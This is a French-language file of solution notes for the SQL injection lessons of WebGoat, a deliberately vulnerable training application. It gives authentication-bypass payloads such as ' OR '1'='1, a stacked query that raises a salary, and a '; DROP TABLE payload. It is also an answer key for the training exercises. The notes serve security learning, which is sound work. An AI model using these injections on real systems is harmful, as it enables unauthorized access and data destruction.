@@ -1,0 +1,66 @@
+Exercice : Webgoat
+
+# Installation : 
+
+    docker pull webgoat/webgoat
+    docker run -p 8080:8080 webgoat/webgoat
+
+
+# Exercice Injection (intro) A3:
+
+    # 2
+        APPROCHE : SQL basique
+
+        SELECT department
+        FROM employees
+        WHERE first_name = 'Bob' AND last_name = 'Franco';
+
+    # 3 
+        APPROCHE : SQL basique
+
+        UPDATE employees
+        SET department = 'Sales'
+        WHERE first_name = 'Tobi' AND last_name = 'Barnett';
+
+    # 4
+        APPROCHE : SQL basique
+
+        ALTER TABLE employees
+        ADD phone varchar(20);
+
+    # 5 
+        APPROCHE : On peut trouver des solutions sur la doc sql
+
+        GRANT SELECT, INSERT, UPDATE, DELETE ON grant_rights TO unauthorized_user;
+
+    # 9
+        APPROCHE : Injection SQL par une égalité boolean
+
+        SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '	
+        Smith
+        or
+        1=1
+        '
+
+    # 10
+        APPROCHE : La même que l'exo d'avant sauf que c'est dans un input
+
+        Login_Count: 1
+        User_Id: '1' OR 1=1
+
+    # 11
+        APPROCHE : Pareil que avant sauf que la requête a changé, il faut donc trouver une autre solution au niveau des guillemets
+
+        Employee Name:	' OR '1'='1
+        Authentication TAN: ' OR '1'='1
+
+    # 12
+        APPROCHE : Celle-ci est plus compliqué car on a pas le requête en visuel, par chance c'est la même faille que l'exo d'avant. Ensuite il suffit de faire un UPDATE
+
+        Employee Name: Smith
+        Authentication TAN: ' OR '1'='1'; UPDATE employees SET SALARY = 1000000 WHERE first_name = 'John' OR '1'='2
+
+    # 13
+        APPROCHE : Trouver la faille, assez simple puis drop la table.
+
+        '; DROP TABLE access_log
